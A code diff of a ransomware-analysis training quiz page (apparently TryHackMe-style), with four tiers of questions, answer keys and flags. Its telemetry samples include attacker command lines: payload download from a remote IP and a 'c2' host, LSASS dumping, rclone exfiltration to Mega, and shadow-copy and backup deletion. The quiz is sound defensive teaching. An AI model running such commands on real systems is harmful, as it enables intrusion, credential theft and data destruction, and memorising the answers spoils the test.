-       hint:'T1567 is Exfiltration Over Web Service. Sub-technique .002 specifically names the destination type — cloud-hosted file storage platforms like Mega, S3, or Google Drive.'}
-    ]
-  }
-];
+const RA_TIERS=[{id:0,label:'NOVICE',tierClass:'tier-novice',accent:'#39d353',terminalLabel:'ransomware-analysis.sh — tier 1: novice',roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — NOVICE',roomDesc:'Identify ransomware techniques from the attack chain. Answer correctly to unlock the next task.',ctitle:'NOVICE TIER CLEARED',csub:'Foundational ransomware technique knowledge validated. Advancing to Intermediate.',flag:'THM{ransomware_novice_analyst}',nextLabel:'INTERMEDIATE',tasks:[{title:'Initial Access Method',code:'Telemetry:\n  Event ID: 4625 x156 — admin account, src: 91.121.44.7\n  Event ID: 4624 — Logon Type 10, src: 91.121.44.7\n  Time between first failure and success: 00:04:22',prompt:'What initial access technique do repeated 4625 failures followed by a 4624 Type 10 success indicate?',placeholder:'Enter technique name...',answers:['brute force','rdp brute force','bruteforce','brute-force'],hint:null},{title:'Persistence Mechanism',code:'Event ID: 7045 — New Service Installed\nService Name: WindowsUpdateSvc32\nBinary Path: C:\\Windows\\Temp\\svch0st.exe\nStart Type: Auto',prompt:'What MITRE ATT&CK technique ID describes persistence via installing a malicious Windows service?',placeholder:'Enter technique ID (T1543.xxx)...',answers:['t1543.003','1543.003'],hint:null},{title:'Credential Dumping Tool',code:'Event ID: 4688\nProcess: cmd.exe\nCommandLine: procdump.exe -ma lsass.exe lsass.dmp\nEvent ID: 4656 — Handle to lsass.exe\nGrantedAccess: 0x1010',prompt:'What tool is being used to dump LSASS memory in this telemetry?',placeholder:'Enter tool name...',answers:['procdump','procdump.exe','sysinternals procdump'],hint:null},{title:'Impact — File Encryption Indicator',code:'Alert: Rapid file rename events\nSource: svchost32.exe\nPattern: *.docx → *.docx.locked (x4400 in 00:01:12)\nFile: READ_ME_RANSOM.txt dropped in every directory',prompt:'What MITRE ATT&CK technique ID describes ransomware encrypting files for impact?',placeholder:'Enter technique ID (T1xxx)...',answers:['t1486','1486'],hint:null}]},{id:1,label:'INTERMEDIATE',tierClass:'tier-intermediate',accent:'#58a6ff',terminalLabel:'ransomware-analysis.sh — tier 2: intermediate',roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — INTERMEDIATE',roomDesc:'Deeper MITRE mapping and multi-stage attack chain reasoning. Hints available.',ctitle:'INTERMEDIATE TIER CLEARED',csub:'Attack chain mapping and sub-technique identification validated.',flag:'THM{ransomware_intermediate_analyst}',nextLabel:'HARD',tasks:[{title:'Execution via Macro',code:'Process Tree:\n  winword.exe\n  └─ cmd.exe /c powershell -WindowStyle Hidden -enc [base64]\n     └─ mshta.exe http://185.220.101.45/payload.hta\n\nEvent ID: 4688 — all processes above\nNo binary dropped — fileless second stage',prompt:'What MITRE ATT&CK sub-technique describes Office macros spawning child processes for execution?',placeholder:'Enter sub-technique ID (T1566.xxx)...',answers:['t1566.001','1566.001'],hint:'T1566 covers Phishing. The sub-technique for malicious attachments delivered via email is .001.'},{title:'Lateral Movement via WMI',code:'Event ID: 4688\nProcess: wmiprvse.exe\nCommandLine: wmic /node:192.168.1.104 process call create "cmd /c C:\\Windows\\Temp\\payload.exe"\nAuth: DOMAIN\\svc_backup (harvested creds)\nDest: 192.168.1.104 (File Server)',prompt:'What MITRE ATT&CK sub-technique describes remote process creation via WMI for lateral movement?',placeholder:'Enter sub-technique ID (T1021.xxx)...',answers:['t1021.006','1021.006'],hint:'T1021 covers Remote Services. WMI-based remote execution is sub-technique .006.'},{title:'Defence Evasion — Timestomping',code:'Forensic Analysis:\n  File: C:\\Windows\\Temp\\svch0st.exe\n  Created (NTFS $MFT): 2024-03-14 09:12:44\n  Created (displayed): 2019-01-01 00:00:00\n  Modified (displayed): 2019-01-01 00:00:00\n  Discrepancy: MACE timestamps altered post-drop',prompt:'What MITRE ATT&CK sub-technique describes altering file timestamps to evade detection?',placeholder:'Enter sub-technique ID (T1070.xxx)...',answers:['t1070.006','1070.006'],hint:'T1070 covers Indicator Removal. Modifying MACE timestamps to blend in with legitimate files is sub-technique .006.'},{title:'Exfiltration Tool Identification',code:'Event ID: 4688\nProcess: rclone.exe\nCommandLine: rclone copy C:\\staged\\data.7z remote:mega-exfil --transfers 8\nOutbound: HTTPS to api.mega.nz\nSize: 12.4GB transferred in 00:08:33',prompt:'What cloud storage service is being abused as the exfiltration destination in this log?',placeholder:'Enter service name...',answers:['mega','mega.nz','mega cloud'],hint:'Look at the outbound DNS destination in the command line — it names the cloud platform explicitly.'}]},{id:2,label:'HARD',tierClass:'tier-hard',accent:'#e3b341',terminalLabel:'ransomware-analysis.sh — tier 3: hard',roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — HARD',roomDesc:'Full campaign reconstruction and group attribution from raw evidence. Think carefully.',ctitle:'HARD TIER CLEARED',csub:'Campaign reconstruction and attribution validated. Expert tier unlocked.',flag:'THM{ransomware_hard_attribution}',nextLabel:'EXPERT',tasks:[{title:'RaaS Group Attribution',code:'Campaign IOCs:\n  • Initial access: VPN credential stuffing\n  • Dropper: DarkSide loader (custom packer)\n  • C2: Cobalt Strike — hardcoded domains\n  • Victim: US fuel pipeline operator\n  • Ransom demand: $4.4M in Bitcoin\n  • Double extortion: Yes — data published on leak site\n  • Operator model: Ransomware-as-a-Service',prompt:'Which ransomware group conducted the 2021 US fuel pipeline attack matching these IOCs?',placeholder:'Enter group name...',answers:['darkside','dark side','darkside ransomware'],hint:'This group targeted critical infrastructure in 2021 and caused a major US fuel supply disruption — their name matches their loader tool.'},{title:'Encryption Algorithm Identification',code:'Binary Analysis — encryptor.exe:\n  Strings found:\n    "AES-256-CBC"\n    "RSA-2048"\n  Behaviour:\n    - Generates random AES key per file\n    - AES key encrypted with embedded RSA public key\n    - Victim must pay to receive RSA private key\n  Extension appended: .encrypted',prompt:'What hybrid encryption scheme does this ransomware use? (format: algo1 + algo2)',placeholder:'e.g. AES + RSA...',answers:['aes + rsa','aes-256 + rsa-2048','aes256 + rsa2048','rsa + aes','aes rsa'],hint:'The encryptor generates a symmetric key per file, then protects that key with an asymmetric algorithm. Name both algorithms used.'},{title:'MITRE ATT&CK Sub-Technique — Backup Destruction',code:'Commands observed on Domain Controller:\n  wbadmin delete catalog -quiet\n  bcdedit /set {default} bootstatuspolicy ignoreallfailures\n  bcdedit /set {default} recoveryenabled no\n  wmic shadowcopy delete\n  vssadmin delete shadows /all /quiet',prompt:'What MITRE ATT&CK sub-technique ID covers inhibiting system recovery by deleting backups and shadow copies?',placeholder:'Enter sub-technique ID (T1490.xxx or T1490)...',answers:['t1490','1490'],hint:'This technique has no sub-techniques — it is T1490 at the top level. It covers all actions that prevent system recovery.'},{title:'Network Propagation Method',code:'Event ID: 4776 — NTLM Auth on DC\nSource: WS-01 (192.168.1.101)\nTarget Share: \\\\DC-01\\SYSVOL\n\nEvent ID: 4688 — net.exe on WS-01\nCommandLine: net view /domain\n\nEvent ID: 4689 — wmic.exe\nCommandLine: wmic /node:@targets.txt process call create "certutil -urlcache -f http://c2/enc.exe enc.exe && enc.exe"\n\nTargets.txt: 47 hosts listed',prompt:'What propagation technique describes using WMI to simultaneously deploy ransomware across a pre-enumerated host list?',placeholder:'Enter technique or description...',answers:['worm','lateral movement via wmi','wmi lateral movement','t1047','automated lateral movement','mass deployment'],hint:'The attacker used WMI to push to 47 hosts in a single command. This is automated, mass lateral movement rather than manual host-to-host pivoting.'}]},{id:3,label:'EXPERT',tierClass:'tier-expert',accent:'#f85149',terminalLabel:'ransomware-analysis.sh — tier 4: expert [FINAL]',roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — EXPERT',roomDesc:'Elite-level campaign analysis. Distinguish subtle IOC differences. No margin for error.',ctitle:'ELITE RANSOMWARE ANALYST',csub:'All four tiers cleared. Expert-level ransomware analysis proficiency confirmed.',flag:'THM{elite_ransomware_analyst_certified}',nextLabel:null,tasks:[{title:'Distinguish Similar Encryptors',code:'Sample A:\n  Extension: .hive\n  Note: "Your network has been hacked and encrypted"\n  Payment: Tor .onion site\n  RaaS: Yes\n\nSample B:\n  Extension: .rhysida\n  Note: "We are Rhysida"\n  Payment: Dedicated victim portal\n  Target sector: Healthcare, Education\n  RaaS: Yes\n\nSample C:\n  Extension: .black\n  Note: Restores-Your-Files.txt\n  C2: Cobalt Strike + custom loader\n  Affiliate program: Yes, 80/20 split',prompt:'Which sample matches BlackCat/ALPHV ransomware based on its affiliate split model and extension?',placeholder:'Enter sample letter (A, B or C)...',answers:['c','sample c'],hint:'BlackCat/ALPHV is known for its affiliate-friendly 80/20 revenue split and the .black extension. Match those specific IOCs.'},{title:'Fileless Ransomware Stage',code:'Memory Forensics — memdump analysis:\n  Process: powershell.exe (PID 4812)\n  Injected region: RWX — 0x1f4000 bytes\n  Strings extracted from injected region:\n    "AES_256_CBC_encrypt"\n    "vssadmin delete shadows"\n    "README_DECRYPT.txt"\n  No binary found on disk\n  No registry persistence\n  Executed entirely in memory',prompt:'What MITRE ATT&CK technique ID describes executing malicious code entirely in memory without writing to disk?',placeholder:'Enter technique ID (T1xxx)...',answers:['t1620','1620','t1055','1055'],hint:'This is fileless malware running in a reflectively injected memory region. Look at T1620 (Reflective Code Loading) or T1055 (Process Injection).'},{title:'Double Extortion Timeline',code:'Day 1-3:   Initial access, lateral movement, domain compromise\nDay 4:     Rclone exfiltrates 84GB to attacker-controlled S3 bucket\nDay 5:     Encryptor deployed — 312 hosts encrypted\nDay 6:     Ransom note discovered — $8M demand\nDay 9:     Victim refuses to pay\nDay 11:    Partial data dump published on leak site (23GB)\nDay 14:    Full data published — 84GB released publicly',prompt:'What is the name of the two-stage extortion model where both encryption AND data theft are used as leverage?',placeholder:'Enter extortion model name...',answers:['double extortion','double-extortion','dual extortion'],hint:'This model emerged around 2019 with Maze ransomware. It involves threatening to publish stolen data even if ransom is paid.'},{title:'Full Campaign MITRE Mapping',code:'Campaign summary:\n  1. VPN brute force → T1110.003\n  2. PowerShell execution → T1059.001\n  3. LSASS dump via procdump → T1003.001\n  4. Lateral movement via PsExec → T1569.002\n  5. Rclone exfiltration → T1567.002\n  6. File encryption → T1486\n  7. Shadow copy deletion → T1490\n\nQuestion relates to step 5.',prompt:'What MITRE ATT&CK sub-technique ID does T1567.002 represent? (describe the technique in words)',placeholder:'Enter description...',answers:['exfiltration to cloud storage','exfil to cloud storage','data exfiltration to cloud','cloud storage exfiltration','exfiltration to cloud'],hint:'T1567 is Exfiltration Over Web Service. Sub-technique .002 specifically names the destination type — cloud-hosted file storage platforms like Mega, S3, or Google Drive.'}]}];
 
 let raCurrent=0,raCompleted=new Set(),raTierStart=Date.now();
 function raNorm(s){return s.toLowerCase().replace(/[^a-z0-9.+, ]/g,'').trim();}
-
-function raRender(idx){
-  const t=RA_TIERS[idx];
-  raCompleted.clear();raTierStart=Date.now();
-  document.getElementById('ra-terminal-title').textContent=t.terminalLabel;
-  document.getElementById('ra-room-name').textContent=t.roomName;
-  document.getElementById('ra-room-desc').textContent=t.roomDesc;
-  const badge=document.getElementById('ra-tier-badge');
-  badge.textContent=t.label;badge.className=`room-tier-badge ${t.tierClass}`;
-  document.getElementById('ra-progress-fill').style.background=t.accent;
-  document.getElementById('ra-progress-fill').style.width='0%';
-  document.getElementById('ra-progress-label').textContent='0 / 4 Tasks';
-  document.querySelectorAll('.tier-pip').forEach(pip=>{
-    const ti=parseInt(pip.dataset.tier);pip.className='tier-pip';
-    if(ti<idx)pip.classList.add('done');
-    else if(ti===idx)pip.classList.add('active');
-  });
-  const list=document.getElementById('ra-task-list');
-  list.innerHTML=t.tasks.map((task,i)=>{
-    const n=i+1;
-    return `<div class="task-card ${n===1?'active':'locked'}" id="ra-task${n}">
-      <div class="task-lock-bar"></div>
-      <div class="task-card-inner">
-        <div class="task-header">
-          <span class="task-num-r" style="color:${t.accent};border-color:${t.accent}40;background:${t.accent}12">TASK ${n}</span>
-          <span class="task-title-r">${task.title}</span>
-          <span class="task-completed-badge">✔ SOLVED</span>
-        </div>
-        <div class="code-block-r">${task.code.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
-        <div class="task-prompt-r">${task.prompt}</div>
-        <div class="task-input-row-r">
-          <input class="task-input-room" id="ra-input${n}" type="text" placeholder="${task.placeholder}" autocomplete="off"/>
-          <button class="exec-btn" onclick="raCheck(${n})">Execute</button>
-        </div>
-        <div class="task-feedback-r" id="ra-feedback${n}"></div>
-        ${task.hint?`<button class="hint-btn-r" onclick="raHint(${n})">💡 Hint</button><div class="hint-text-r" id="ra-hint${n}">${task.hint}</div>`:''}
-      </div>
-    </div>`;
-  }).join('');
-  t.tasks.forEach((_,i)=>{
-    document.getElementById(`ra-input${i+1}`).addEventListener('keydown',e=>{if(e.key==='Enter')raCheck(i+1);});
-  });
-}
-
+function raRender(idx){const t=RA_TIERS[idx];raCompleted.clear();raTierStart=Date.now();document.getElementById('ra-terminal-title').textContent=t.terminalLabel;document.getElementById('ra-room-name').textContent=t.roomName;document.getElementById('ra-room-desc').textContent=t.roomDesc;const badge=document.getElementById('ra-tier-badge');badge.textContent=t.label;badge.className=`room-tier-badge ${t.tierClass}`;document.getElementById('ra-progress-fill').style.background=t.accent;document.getElementById('ra-progress-fill').style.width='0%';document.getElementById('ra-progress-label').textContent='0 / 4 Tasks';document.querySelectorAll('.tier-pip').forEach(pip=>{const ti=parseInt(pip.dataset.tier);pip.className='tier-pip';if(ti<idx)pip.classList.add('done');else if(ti===idx)pip.classList.add('active');});const list=document.getElementById('ra-task-list');list.innerHTML=t.tasks.map((task,i)=>{const n=i+1;return`<div class="task-card ${n===1?'active':'locked'}" id="ra-task${n}"><div class="task-lock-bar"></div><div class="task-card-inner"><div class="task-header"><span class="task-num-r" style="color:${t.accent};border-color:${t.accent}40;background:${t.accent}12">TASK ${n}</span><span class="task-title-r">${task.title}</span><span class="task-completed-badge">✔ SOLVED</span></div><div class="code-block-r">${task.code.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div><div class="task-prompt-r">${task.prompt}</div><div class="task-input-row-r"><input class="task-input-room" id="ra-input${n}" type="text" placeholder="${task.placeholder}" autocomplete="off"/><button class="exec-btn" onclick="raCheck(${n})">Execute</button></div><div class="task-feedback-r" id="ra-feedback${n}"></div>${task.hint?`<button class="hint-btn-r" onclick="raHint(${n})">💡 Hint</button><div class="hint-text-r" id="ra-hint${n}">${task.hint}</div>`:''}</div></div>`;}).join('');t.tasks.forEach((_,i)=>{document.getElementById(`ra-input${i+1}`).addEventListener('keydown',e=>{if(e.key==='Enter')raCheck(i+1);});});}
 function raHint(n){document.getElementById(`ra-hint${n}`).classList.toggle('show');}
-
-function raCheck(n){
-  const tier=RA_TIERS[raCurrent],task=tier.tasks[n-1];
-  const input=document.getElementById(`ra-input${n}`);
-  const feedback=document.getElementById(`ra-feedback${n}`);
-  const val=raNorm(input.value);
-  if(!val)return;
-  if(task.answers.includes(val)){
-    input.classList.remove('wrong-r');input.disabled=true;
-    document.querySelector(`#ra-task${n} .exec-btn`).disabled=true;
-    feedback.textContent='✔ Correct. Advancing...';
-    feedback.className='task-feedback-r fb-correct';feedback.style.color=tier.accent;
-    raCompleted.add(n);
-    setTimeout(()=>{
-      document.getElementById(`ra-task${n}`).classList.remove('active');
-      document.getElementById(`ra-task${n}`).classList.add('completed');
-      raUpdateProgress();
-      if(n<4)raUnlock(n+1);else raTierComplete();
-    },700);
-  } else {
-    input.classList.add('wrong-r');
-    feedback.textContent='✘ Incorrect. Review the evidence and try again.';
-    feedback.className='task-feedback-r fb-wrong';
-    setTimeout(()=>input.classList.remove('wrong-r'),500);
-  }
-}
-
-function raUnlock(n){
-  const card=document.getElementById(`ra-task${n}`);
-  card.classList.remove('locked');
-  requestAnimationFrame(()=>requestAnimationFrame(()=>{
-    card.classList.add('active','unlocking');
-    setTimeout(()=>card.classList.remove('unlocking'),800);
-  }));
-  setTimeout(()=>{document.getElementById(`ra-input${n}`).focus();card.scrollIntoView({behavior:'smooth',block:'center'});},450);
-}
-
-function raUpdateProgress(){
-  const c=raCompleted.size;
-  document.getElementById('ra-progress-label').textContent=`${c} / 4 Tasks`;
-  document.getElementById('ra-progress-fill').style.width=`${(c/4)*100}%`;
-}
-
-function raTierComplete(){
-  const t=RA_TIERS[raCurrent];
-  const elapsed=Math.round((Date.now()-raTierStart)/1000);
-  const mins=Math.floor(elapsed/60),secs=(elapsed%60).toString().padStart(2,'0');
-  document.getElementById('ra-stat-time').textContent=`${mins}m${secs}s`;
-  document.getElementById('ra-stat-tasks').textContent=`${(raCurrent+1)*4}/16`;
-  document.getElementById('ra-flag').textContent=t.flag;
-  document.getElementById('ra-ctitle').textContent=t.ctitle;
-  document.getElementById('ra-csub').textContent=t.csub;
-  const isLast=raCurrent===RA_TIERS.length-1;
-  const nextBtn=document.getElementById('ra-next-btn');
-  if(isLast){nextBtn.textContent='✔ All Tiers Cleared';nextBtn.disabled=true;nextBtn.style.opacity='0.5';document.getElementById('ra-stat-tasks').textContent='16/16';}
-  else{nextBtn.textContent=`→ Advance to ${t.nextLabel}`;nextBtn.disabled=false;nextBtn.style.opacity='1';}
-  document.getElementById('ra-retry-btn').textContent=`↺ Retry ${t.label}`;
-  setTimeout(()=>{
-    document.getElementById('completion-overlay-r').classList.add('show');
-    raParticles(t.accent);raTW(raCurrent);
-  },500);
-}
-
-function raAdvance(){
-  if(raCurrent>=RA_TIERS.length-1)return;
-  raCurrent++;
-  document.getElementById('completion-overlay-r').classList.remove('show');
-  const list=document.getElementById('ra-task-list');
-  list.style.opacity='0';list.style.transform='translateY(-8px)';
-  setTimeout(()=>{raRender(raCurrent);list.style.transition='opacity 0.4s,transform 0.4s';list.style.opacity='1';list.style.transform='translateY(0)';document.getElementById('ra-room-terminal').scrollIntoView({behavior:'smooth',block:'start'});},300);
-}
-
+function raCheck(n){const tier=RA_TIERS[raCurrent],task=tier.tasks[n-1],input=document.getElementById(`ra-input${n}`),feedback=document.getElementById(`ra-feedback${n}`),val=raNorm(input.value);if(!val)return;if(task.answers.includes(val)){input.classList.remove('wrong-r');input.disabled=true;document.querySelector(`#ra-task${n} .exec-btn`).disabled=true;feedback.textContent='✔ Correct. Advancing...';feedback.className='task-feedback-r fb-correct';feedback.style.color=tier.accent;raCompleted.add(n);setTimeout(()=>{document.getElementById(`ra-task${n}`).classList.remove('active');document.getElementById(`ra-task${n}`).classList.add('completed');raUpdateProgress();if(n<4)raUnlock(n+1);else raTierComplete();},700);}else{input.classList.add('wrong-r');feedback.textContent='✘ Incorrect. Review the evidence and try again.';feedback.className='task-feedback-r fb-wrong';setTimeout(()=>input.classList.remove('wrong-r'),500);}}
+function raUnlock(n){const card=document.getElementById(`ra-task${n}`);card.classList.remove('locked');requestAnimationFrame(()=>requestAnimationFrame(()=>{card.classList.add('active','unlocking');setTimeout(()=>card.classList.remove('unlocking'),800);}));setTimeout(()=>{document.getElementById(`ra-input${n}`).focus();card.scrollIntoView({behavior:'smooth',block:'center'});},450);}
+function raUpdateProgress(){const c=raCompleted.size;document.getElementById('ra-progress-label').textContent=`${c} / 4 Tasks`;document.getElementById('ra-progress-fill').style.width=`${(c/4)*100}%`;}
+function raTierComplete(){const t=RA_TIERS[raCurrent],elapsed=Math.round((Date.now()-raTierStart)/1000),mins=Math.floor(elapsed/60),secs=(elapsed%60).toString().padStart(2,'0');document.getElementById('ra-stat-time').textContent=`${mins}m${secs}s`;document.getElementById('ra-stat-tasks').textContent=`${(raCurrent+1)*4}/16`;document.getElementById('ra-flag').textContent=t.flag;document.getElementById('ra-ctitle').textContent=t.ctitle;document.getElementById('ra-csub').textContent=t.csub;const isLast=raCurrent===RA_TIERS.length-1,nextBtn=document.getElementById('ra-next-btn');if(isLast){nextBtn.textContent='✔ All Tiers Cleared';nextBtn.disabled=true;nextBtn.style.opacity='0.5';document.getElementById('ra-stat-tasks').textContent='16/16';}else{nextBtn.textContent=`→ Advance to ${t.nextLabel}`;nextBtn.disabled=false;nextBtn.style.opacity='1';}document.getElementById('ra-retry-btn').textContent=`↺ Retry ${t.label}`;setTimeout(()=>{document.getElementById('completion-overlay-r').classList.add('show');raParticles(t.accent);raTW(raCurrent);},500);}
+function raAdvance(){if(raCurrent>=RA_TIERS.length-1)return;raCurrent++;document.getElementById('completion-overlay-r').classList.remove('show');const list=document.getElementById('ra-task-list');list.style.opacity='0';list.style.transform='translateY(-8px)';setTimeout(()=>{raRender(raCurrent);list.style.transition='opacity 0.4s,transform 0.4s';list.style.opacity='1';list.style.transform='translateY(0)';document.getElementById('ra-room-terminal').scrollIntoView({behavior:'smooth',block:'start'});},300);}
 function raRetry(){document.getElementById('completion-overlay-r').classList.remove('show');setTimeout(()=>raRender(raCurrent),300);}
-
-const raTwSets=[
-  ['Initial access and impact techniques identified.','MITRE mapping validated.','Flag: THM{ransomware_novice_analyst}'],
-  ['Sub-technique mapping complete.','Attack chain correlation confirmed.','Flag: THM{ransomware_intermediate_analyst}'],
-  ['Campaign attribution and reconstruction validated.','Flag: THM{ransomware_hard_attribution}'],
-  ['All four tiers cleared. Elite analyst status confirmed.','Flag: THM{elite_ransomware_analyst_certified}']
-];
-
-function raTW(idx){
-  const lines=raTwSets[idx],el=document.getElementById('ra-ctw');
-  let li=0,ci=0;el.textContent='';
-  function type(){
-    if(li>=lines.length)return;
-    const line=lines[li];
-    if(ci<line.length){el.textContent=line.slice(0,++ci);setTimeout(type,40);}
-    else{setTimeout(()=>{li++;ci=0;if(li<lines.length){el.textContent='';setTimeout(type,300);}},1200);}
-  }
-  setTimeout(type,500);
-}
-
-function raParticles(color){
-  const canvas=document.getElementById('completion-canvas-r'),ctx=canvas.getContext('2d');
-  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
-  const chars=['0','1','T','P','>','✔','#','$'];const particles=[];
-  function spawn(n){for(let i=0;i<n;i++)particles.push({x:Math.random()*canvas.width,y:canvas.height*0.5+Math.random()*canvas.height*0.5,vy:-(Math.random()*2.5+0.8),vx:(Math.random()-0.5)*1.2,alpha:Math.random()*0.6+0.3,char:chars[Math.floor(Math.random()*chars.length)],size:Math.random()*11+7,decay:Math.random()*0.004+0.002});}
-  spawn(80);let waves=0;
-  const wi=setInterval(()=>{if(waves++>4){clearInterval(wi);return;}spawn(35);},600);
-  function draw(){ctx.clearRect(0,0,canvas.width,canvas.height);let alive=false;particles.forEach(p=>{if(p.alpha<=0)return;alive=true;ctx.globalAlpha=p.alpha;ctx.fillStyle=color;ctx.font=`${p.size}px 'Share Tech Mono',monospace`;ctx.fillText(p.char,p.x,p.y);p.y+=p.vy;p.x+=p.vx;p.alpha-=p.decay;});if(alive)requestAnimationFrame(draw);}
-  draw();
-}
-
+const raTwSets=[['Initial access and impact techniques identified.','MITRE mapping validated.','Flag: THM{ransomware_novice_analyst}'],['Sub-technique mapping complete.','Attack chain correlation confirmed.','Flag: THM{ransomware_intermediate_analyst}'],['Campaign attribution and reconstruction validated.','Flag: THM{ransomware_hard_attribution}'],['All four tiers cleared. Elite analyst status confirmed.','Flag: THM{elite_ransomware_analyst_certified}']];
+function raTW(idx){const lines=raTwSets[idx],el=document.getElementById('ra-ctw');let li=0,ci=0;el.textContent='';function type(){if(li>=lines.length)return;const line=lines[li];if(ci<line.length){el.textContent=line.slice(0,++ci);setTimeout(type,40);}else{setTimeout(()=>{li++;ci=0;if(li<lines.length){el.textContent='';setTimeout(type,300);}},1200);}}setTimeout(type,500);}
+function raParticles(color){const canvas=document.getElementById('completion-canvas-r'),ctx=canvas.getContext('2d');canvas.width=window.innerWidth;canvas.height=window.innerHeight;const chars=['0','1','T','P','>','✔','#','$'],particles=[];function spawn(n){for(let i=0;i<n;i++)particles.push({x:Math.random()*canvas.width,y:canvas.height*0.5+Math.random()*canvas.height*0.5,vy:-(Math.random()*2.5+0.8),vx:(Math.random()-0.5)*1.2,alpha:Math.random()*0.6+0.3,char:chars[Math.floor(Math.random()*chars.length)],size:Math.random()*11+7,decay:Math.random()*0.004+0.002});}spawn(80);let waves=0;const wi=setInterval(()=>{if(waves++>4){clearInterval(wi);return;}spawn(35);},600);function draw(){ctx.clearRect(0,0,canvas.width,canvas.height);let alive=false;particles.forEach(p=>{if(p.alpha<=0)return;alive=true;ctx.globalAlpha=p.alpha;ctx.fillStyle=color;ctx.font=`${p.size}px 'Share Tech Mono',monospace`;ctx.fillText(p.char,p.x,p.y);p.y+=p.vy;p.x+=p.vx;p.alpha-=p.decay;});if(alive)requestAnimationFrame(draw);}draw();}
 raRender(0);
 </script>
+<script>window.ANTHROPIC_API_KEY = 'YOUR-API-KEY-HERE';</script>
 <script src="matrix.js"></script>
 </body>
 </html>
